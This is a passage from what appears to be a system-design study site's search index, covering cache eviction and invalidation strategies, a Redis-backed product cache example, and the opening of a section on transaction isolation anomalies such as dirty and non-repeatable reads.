Eventual Medium Abstraction, frameworks Refresh-Ahead Excellent N/A Eventual High Hot data, predictable patterns"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#cache-eviction-policies","title":"Cache Eviction Policies","text":"<p>When cache is full, eviction policies determine which data to remove:</p> <p>1. LRU (Least Recently Used) - Evicts data not accessed for longest time - Good for most use cases - Commonly used default</p> <p>2. LFU (Least Frequently Used) - Evicts data accessed least often - Good for long-term popular data - Requires frequency tracking</p> <p>3. FIFO (First In, First Out) - Evicts oldest data first - Simple but not optimal - Ignores access patterns</p> <p>4. TTL (Time To Live) - Data expires after fixed time - Prevents stale data - Requires setting appropriate TTL values</p> <p>5. Random - Evicts random entry - Very simple, unpredictable - Rarely used in practice</p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#cache-invalidation-strategies","title":"Cache Invalidation Strategies","text":"<p>Keeping cache in sync with database:</p> <p>1. Time-Based (TTL) <pre><code># Set TTL of 1 hour\ncache.setex(\"user:1\", 3600, \"John\")\n</code></pre></p> <p>2. Event-Based (Active Invalidation) <pre><code># On update, delete cache\ndef update_user(user_id, new_name):\n    db.update(user_id, new_name)\n    cache.delete(f\"user:{user_id}\")  # Invalidate\n</code></pre></p> <p>3. Cache Versioning <pre><code># Include version in key\ncache.set(\"user:1:v2\", \"John\")  # Version 2\n</code></pre></p> <p>4. Publisher-Subscriber <pre><code># Use Redis pub/sub to invalidate across servers\ndef update_user(user_id, new_name):\n    db.update(user_id, new_name)\n    redis.publish(\"invalidate\", f\"user:{user_id}\")\n\n# Subscribers delete from their local cache\n</code></pre></p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#best-practices","title":"Best Practices","text":"<ol> <li>Set Appropriate TTLs</li> <li>Short TTL for frequently changing data (minutes)</li> <li>Long TTL for static data (hours/days)</li> <li> <p>No TTL for permanent data</p> </li> <li> <p>Monitor Cache Performance</p> </li> <li>Track hit rate (hits / total requests)</li> <li>Target: 80%+ hit rate</li> <li> <p>Monitor latency (p50, p95, p99)</p> </li> <li> <p>Handle Cache Failures</p> </li> <li>Always have database fallback</li> <li>Use circuit breakers</li> <li> <p>Degrade gracefully</p> </li> <li> <p>Avoid Thundering Herd</p> </li> <li>When cache expires, many requests hit DB</li> <li> <p>Solution: Refresh before expiry, use locks</p> </li> <li> <p>Cache Compression</p> </li> <li>Compress large objects to save memory</li> <li> <p>Trade CPU for memory</p> </li> <li> <p>Security</p> </li> <li>Don't cache sensitive data (passwords, credit cards)</li> <li>Encrypt cached data if needed</li> <li>Use authentication for cache access</li> </ol>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#complete-example-e-commerce-product-cache","title":"Complete Example: E-commerce Product Cache","text":"<pre><code>import redis\nimport psycopg2\nimport json\nimport hashlib\nfrom datetime import datetime, timedelta\n\nclass ProductCache:\n    def __init__(self):\n        self.cache = redis.Redis(host='localhost', port=6379, decode_responses=True)\n        self.db = psycopg2.connect(\"dbname=ecommerce user=postgres\")\n\n    def get_product(self, product_id):\n        \"\"\"Cache-Aside pattern for product retrieval\"\"\"\n        cache_key = f\"product:{product_id}\"\n\n        # Try cache first\n        cached_data = self.cache.get(cache_key)\n        if cached_data:\n            print(f\"\u2713 Cache HIT: product {product_id}\")\n            return json.loads(cached_data)\n\n        # Cache miss - fetch from database\n        print(f\"\u2717 Cache MISS: product {product_id}\")\n        cursor = self.db.cursor()\n        cursor.execute(\"\"\"\n            SELECT id, name, price, stock, description \n            FROM products \n            WHERE id = %s\n        \"\"\", (product_id,))\n\n        result = cursor.fetchone()\n        if not result:\n            return None\n\n        product = {\n            'id': result[0],\n            'name': result[1],\n            'price': float(result[2]),\n            'stock': result[3],\n            'description': result[4]\n        }\n\n        # Cache for 1 hour\n        self.cache.setex(cache_key, 3600, json.dumps(product))\n\n        return product\n\n    def update_product_price(self, product_id, new_price):\n        \"\"\"Write-Through pattern for price update\"\"\"\n        cache_key = f\"product:{product_id}\"\n\n        # Update database\n        cursor = self.db.cursor()\n        cursor.execute(\n            \"UPDATE products SET price = %s WHERE id = %s\",\n            (new_price, product_id)\n        )\n        self.db.commit()\n\n        # Invalidate cache (next read will refresh)\n        self.cache.delete(cache_key)\n\n        print(f\"Updated product {product_id} price to ${new_price}\")\n\n    def get_popular_products(self, category, limit=10):\n        \"\"\"Cache popular products with shorter TTL\"\"\"\n        cache_key = f\"popular:{category}:{limit}\"\n\n        cached_data = self.cache.get(cache_key)\n        if cached_data:\n            print(f\"\u2713 Cache HIT: popular products in {category}\")\n            return json.loads(cached_data)\n\n        print(f\"\u2717 Cache MISS: popular products in {category}\")\n        cursor = self.db.cursor()\n        cursor.execute(\"\"\"\n            SELECT id, name, price \n            FROM products \n            WHERE category = %s \n            ORDER BY sales_count DESC \n            LIMIT %s\n        \"\"\", (category, limit))\n\n        products = [\n            {'id': row[0], 'name': row[1], 'price': float(row[2])}\n            for row in cursor.fetchall()\n        ]\n\n        # Cache for only 5 minutes (popular products change frequently)\n        self.cache.setex(cache_key, 300, json.dumps(products))\n\n        return products\n\n    def record_view(self, product_id):\n        \"\"\"Write-Behind pattern for analytics (async)\"\"\"\n        # Increment view count in cache immediately\n        cache_key = f\"views:{product_id}\"\n        new_count = self.cache.incr(cache_key)\n\n        # Batch update to DB every 100 views\n        if new_count % 100 == 0:\n            cursor = self.db.cursor()\n            cursor.execute(\n                \"UPDATE products SET view_count = view_count + 100 WHERE id = %s\",\n                (product_id,)\n            )\n            self.db.commit()\n            print(f\"Flushed 100 views for product {product_id} to database\")\n\n    def get_cache_stats(self):\n        \"\"\"Monitor cache performance\"\"\"\n        info = self.cache.info('stats')\n        hits = int(info.get('keyspace_hits', 0))\n        misses = int(info.get('keyspace_misses', 0))\n        total = hits + misses\n\n        if total &gt; 0:\n            hit_rate = (hits / total) * 100\n            print(f\"Cache Hit Rate: {hit_rate:.2f}% ({hits} hits, {misses} misses)\")\n        else:\n            print(\"No cache statistics available yet\")\n\n# Usage Example\nproduct_cache = ProductCache()\n\n# First access - cache miss\nproduct = product_cache.get_product(123)\nprint(product)\n\n# Second access - cache hit\nproduct = product_cache.get_product(123)\n\n# Update price - invalidates cache\nproduct_cache.update_product_price(123, 29.99)\n\n# Next access - cache miss (refreshed)\nproduct = product_cache.get_product(123)\n\n# Popular products\npopular = product_cache.get_popular_products(\"electronics\", 5)\n\n# Track views (write-behind)\nfor i in range(150):\n    product_cache.record_view(123)  # Flushes to DB at 100 and 200\n\n# Check performance\nproduct_cache.get_cache_stats()\n</code></pre>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#summary","title":"Summary","text":"<p>Distributed Cache solves the problem of sharing cached data across multiple application instances, ensuring consistency and scalability.</p> <p>Caching Strategies: - Cache-Aside: Application controls caching, best for general use - Write-Through: Strong consistency, good for reads - Write-Behind: High performance writes, eventual consistency - Write-Around: Bypass cache on writes, prevents pollution, good for rare reads - Read-Through: Abstraction, cache handles DB - Refresh-Ahead: Proactive refresh, best for hot data</p> <p>Choose based on: - Read vs write ratio - Consistency requirements - Performance needs - Complexity tolerance</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/","title":"Distributed Concurrency Control","text":""},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#youtube","title":"Youtube","text":"<ul> <li>20. Handle Distributed Transactions | Two-Phase Commit (2PC), Three-Phase Commit (3PC), SAGA Pattern</li> <li>System Design: Concurrency Control in Distributed System | Optimistic &amp; Pessimistic Concurrency Lock</li> <li>23. Two Phase Locking (2PL) | System Design</li> <li>Dual Write Problem | Designing Event-Driven Microservices</li> </ul>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#theory","title":"Theory","text":""},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#1-what-is-a-transaction-and-what-is-isolation-in-a-transaction","title":"1. What is a Transaction and What is Isolation in a Transaction?","text":""},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#what-is-a-transaction","title":"What is a Transaction?","text":"<p>A transaction is a logical unit of work that consists of one or more database operations (INSERT, UPDATE, DELETE, SELECT) that are executed as a single atomic unit. The transaction either completes entirely or has no effect at all.</p> <p>ACID Properties of Transactions:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    ACID PROPERTIES                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                             \u2502\n\u2502  A - Atomicity                                              \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502  \u2502 All operations succeed OR all fail         \u2502            \u2502\n\u2502  \u2502 No partial completion                      \u2502            \u2502\n\u2502  \u2502 Example: Bank transfer - debit + credit    \u2502            \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                             \u2502\n\u2502  C - Consistency                                            \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502  \u2502 Database moves from one valid state        \u2502            \u2502\n\u2502  \u2502 to another valid state                     \u2502            \u2502\n\u2502  \u2502 Constraints maintained (foreign keys, etc) \u2502            \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                             \u2502\n\u2502  I - Isolation                                              \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502  \u2502 Concurrent transactions don't interfere    \u2502            \u2502\n\u2502  \u2502 Each transaction appears to run alone      \u2502            \u2502\n\u2502  \u2502 Multiple isolation levels available        \u2502            \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                             \u2502\n\u2502  D - Durability                                             \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502  \u2502 Once committed, changes are permanent      \u2502            \u2502\n\u2502  \u2502 Survives system crashes                    \u2502            \u2502\n\u2502  \u2502 Written to persistent storage (disk)       \u2502            \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Transaction Example:</p> <pre><code>Bank Transfer Transaction:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 BEGIN TRANSACTION;                         \u2502\n\u2502                                            \u2502\n\u2502 1. Read balance of Account A              \u2502\n\u2502    \u2192 $1000                                 \u2502\n\u2502                                            \u2502\n\u2502 2. Deduct $100 from Account A              \u2502\n\u2502    UPDATE accounts                         \u2502\n\u2502    SET balance = balance - 100             \u2502\n\u2502    WHERE account_id = 'A'                  \u2502\n\u2502    \u2192 A now has $900                        \u2502\n\u2502                                            \u2502\n\u2502 3. Add $100 to Account B                   \u2502\n\u2502    UPDATE accounts                         \u2502\n\u2502    SET balance = balance + 100             \u2502\n\u2502    WHERE account_id = 'B'                  \u2502\n\u2502    \u2192 B now has $600                        \u2502\n\u2502                                            \u2502\n\u2502 COMMIT;                                    \u2502\n\u2502                                            \u2502\n\u2502 If ANY step fails \u2192 ROLLBACK (undo all)   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#what-is-isolation","title":"What is Isolation?","text":"<p>Isolation is the \"I\" in ACID. It determines how and when changes made by one transaction become visible to other concurrent transactions.</p> <p>Why Isolation is Critical:</p> <pre><code>Without Isolation:\n\nTransaction 1: Transfer $100 from A to B\nTransaction 2: Calculate total balance (A + B)\n\nTimeline without proper isolation:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nT1: Read A ($1000)\nT1: Deduct $100 from A (A = $900)\n                        T2: Read A ($900) \u2190 Wrong!\n                        T2: Read B ($500) \u2190 B not updated yet\n                        T2: Total = $1400 \u2190 INCORRECT! (should be $1500)\nT1: Add $100 to B (B = $600)\nT1: Commit\n\nProblem: T2 sees inconsistent state (money disappeared!)\n</code></pre> <p>Isolation Levels Trade-off:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         Isolation Level Spectrum                           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                            \u2502\n\u2502  Weak Isolation          \u2190\u2192          Strong Isolation     \u2502\n\u2502  (High Performance)                  (High Correctness)   \u2502\n\u2502                                                            \u2502\n\u2502  Read Uncommitted                                          \u2502\n\u2502       \u2193                                                    \u2502\n\u2502  Read Committed                                            \u2502\n\u2502       \u2193                                                    \u2502\n\u2502  Repeatable Read                                           \u2502\n\u2502       \u2193                                                    \u2502\n\u2502  Serializable                                              \u2502\n\u2502                                                            \u2502\n\u2502  \u2191 More Concurrency    vs    More Consistency \u2191           \u2502\n\u2502  \u2193 Less Consistent          Less Concurrent   \u2193           \u2502\n\u2502                                                            \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pseudo Code - Transaction Structure:</p> <pre><code>def execute_transaction():\n    \"\"\"Basic transaction structure\"\"\"\n    connection = get_database_connection()\n\n    try:\n        # Start transaction\n        connection.begin_transaction()\n\n        # Execute operations\n        operation1(connection)\n        operation2(connection)\n        operation3(connection)\n\n        # Commit if all succeed\n        connection.commit()\n        print(\"Transaction committed successfully\")\n\n    except Exception as e:\n        # Rollback on any error\n        connection.rollback()\n        print(f\"Transaction rolled back: {e}\")\n\n    finally:\n        connection.close()\n\n\ndef bank_transfer(from_account, to_account, amount):\n    \"\"\"Real-world transaction example\"\"\"\n    connection = get_database_connection()\n\n    try:\n        connection.begin_transaction()\n\n        # 1. Check sufficient balance\n        balance = connection.execute(\n            \"SELECT balance FROM accounts WHERE id = ?\",\n            [from_account]\n        ).fetchone()[0]\n\n        if balance &lt; amount:\n            raise InsufficientFundsError()\n\n        # 2. Debit from source account\n        connection.execute(\n            \"UPDATE accounts SET balance = balance - ? WHERE id = ?\",\n            [amount, from_account]\n        )\n\n        # 3. Credit to destination account\n        connection.execute(\n            \"UPDATE accounts SET balance = balance + ? WHERE id = ?\",\n            [amount, to_account]\n        )\n\n        # 4. Log transaction\n        connection.execute(\n            \"INSERT INTO transfers (from_acc, to_acc, amount, timestamp) VALUES (?, ?, ?, ?)\",\n            [from_account, to_account, amount, now()]\n        )\n\n        connection.commit()\n        return True\n\n    except Exception as e:\n        connection.rollback()\n        log_error(e)\n        return False\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#2-what-are-the-isolation-problems","title":"2. What are the Isolation Problems?","text":"<p>When multiple transactions run concurrently without proper isolation, several anomalies can occur:</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#21-dirty-read-problem","title":"2.1 Dirty Read Problem","text":"<p>Description:</p> <p>A dirty read occurs when a transaction reads data that has been modified by another transaction but not yet committed. If the other transaction rolls back, the first transaction has read data that never actually existed in the database.</p> <p>Context &amp; Problem:</p> <pre><code>Timeline of Dirty Read:\n\nTime    Transaction 1                    Transaction 2\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nt1      BEGIN TRANSACTION\nt2      UPDATE account \n        SET balance = 900\n        WHERE id = 'A'\n        (balance was 1000)\n                                         BEGIN TRANSACTION\nt3                                       SELECT balance \n                                         FROM account\n                                         WHERE id = 'A'\n                                         \u2192 Reads 900 (DIRTY!)\nt4      ROLLBACK                         \n        (balance returns to 1000)\n\nt5                                       Uses balance = 900\n                                         \u2190 WRONG! Should be 1000\n                                         COMMIT\n\nProblem: Transaction 2 read uncommitted data that was rolled back!\n</code></pre> <p>Visual Diagram:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    DIRTY READ ANOMALY                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Transaction 1              Database          Transaction 2\n\u2502                                                         \u2502\n\u2502  BEGIN                                                  \u2502\n\u2502    \u2502                                                    \u2502\n\u2502    \u251c\u2500 UPDATE balance=900 \u2500\u2500\u2192 [balance=900]            \u2502\n\u2502    \u2502                            (uncommitted)          \u2502\n\u2502    \u2502                                 \u2502                 \u2502\n\u2502    \u2502                                 \u2514\u2500\u2500\u2500\u2500\u2192 BEGIN      \u2502\n\u2502    \u2502                                        READ \u2500\u2500\u2192 900 (DIRTY!)\n\u2502    \u2502                                          \u2502        \u2502\n\u2502  ROLLBACK \u2500\u2500\u2192 [balance=1000]                 \u2502        \u2502\n\u2502               (original restored)             \u2502        \u2502\n\u2502                                              Uses 900 \u2190 WRONG!\n\u2502                                               COMMIT   \u2502\n\u2502                                                         \u2502\n\u2502  Result: Transaction 2 based decision on invalid data  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pseudo Code Example:</p> <pre><code># Dirty Read Scenario\n\n# Transaction 1 (will rollback)\ndef transaction_1(db):\n    db.begin()\n    # Update product price\n    db.execute(\"UPDATE products SET price = 50 WHERE id = 1\")  # Was 100\n    # Simulate some processing\n    time.sleep(2)\n    # Oops, error! Rollback\n    db.rollback()  # Price returns to 100\n\n# Transaction 2 (reads dirty data)\ndef transaction_2(db):\n    time.sleep(1)  # Starts after T1's update\n    db.begin()\n    # Reads uncommitted price\n    price = db.execute(\"SELECT price FROM products WHERE id = 1\").fetchone()\n    print(f\"Price: {price}\")  # Prints 50 (DIRTY!)\n\n    # Makes decision based on dirty data\n    if price &lt; 60:\n        db.execute(\"INSERT INTO orders (product_id, quantity) VALUES (1, 100)\")\n    db.commit()\n    # But actual price is 100, not 50! Order should not have been placed!\n\n\n# How to prevent: Use READ COMMITTED or higher isolation\ndef transaction_2_safe(db):\n    db.set_isolation_level(\"READ COMMITTED\")\n    db.begin()\n    # Now will wait for T1 to commit/rollback before reading\n    price = db.execute(\"SELECT price FROM products WHERE id = 1\").fetchone()\n    # Correctly reads 100 (after T1 rollback)\n</code></pre> <p>Advantages of Allowing Dirty Reads: - \u2705 Maximum concurrency (no blocking) - \u2705 Highest performance - \u2705 Useful for approximate queries (e.g., dashboards showing \"live\" stats)</p> <p>Disadvantages: - \u274c Can read invalid data - \u274c Business logic errors (decisions based on data that doesn't exist) - \u274c Violates data integrity</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#22-non-repeatable-read-problem","title":"2.2 Non-Repeatable Read Problem","text":"<p>Description:</p> <p>A non-repeatable read occurs when a transaction reads the same row twice and gets different values because another transaction modified and committed the data between the two reads.</p> <p>Context &amp; Problem:</p> <pre><code>Timeline of Non-Repeatable Read:\n\nTime    Transaction 1                    Transaction 2\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nt1      BEGIN TRANSACTION\nt2      SELECT balance \n        FROM account WHERE id = 'A'\n        \u2192 Reads 1000\n                                         BEGIN TRANSACTION\nt3                                       UPDATE account\n                                         SET balance = 900\n                                         WHERE id = 'A'\nt4                                       COMMIT\n\nt5      SELECT balance \n        FROM account WHERE id = 'A'\n        \u2192 Reads 900 (DIFFERENT!)\n\nt6      COMMIT\n\nProblem: Same query, different results within one transaction!\n</code></pre> <p>Visual Diagram:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502             NON-REPEATABLE READ ANOMALY                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Transaction 1              Database          Transaction 2\n\u2502                                                         \u2502\n\u2502  BEGIN                                                  \u2502\n\u2502    \u2502                                                    \u2502\n\u2502    \u251c\u2500 READ balance \u2500\u2500\u2500\u2500\u2500\u2500\u2192 [balance=1000]             \u2502\n\u2502    \u2502    (First read: 1000)      \u2502                      \u2502\n\u2502    \u2502                            \u2502                      \u2502\n\u2502    \u2502                            \u2502           BEGIN      \u2502\n\u2502    \u2502                            \u2502             \u2502        \u2502\n\u2502    \u2502                    [balance=900] \u2190\u2500\u2500 UPDATE       \u2502\n\u2502    \u2502                            \u2502             \u2502        \u2502\n\u2502    \u2502                            \u2502           COMMIT     \u2502\n\u2502    \u2502                            \u2502                      \u2502\n\u2502    \u251c\u2500 READ balance \u2500\u2500\u2500\u2500\u2500\u2500\u2192 [balance=900]              \u2502\n\u2502    \u2502    (Second read: 900) \u2190 DIFFERENT!                \u2502\n\u2502    \u2502                                                    \u2502\n\u2502  COMMIT                                                 \u2502\n\u2502                                                         \u2502\n\u2502  Problem: Transaction 1 sees inconsistent view of data  \u2502\n\u2502  Use Case Affected: Financial reports, analytics       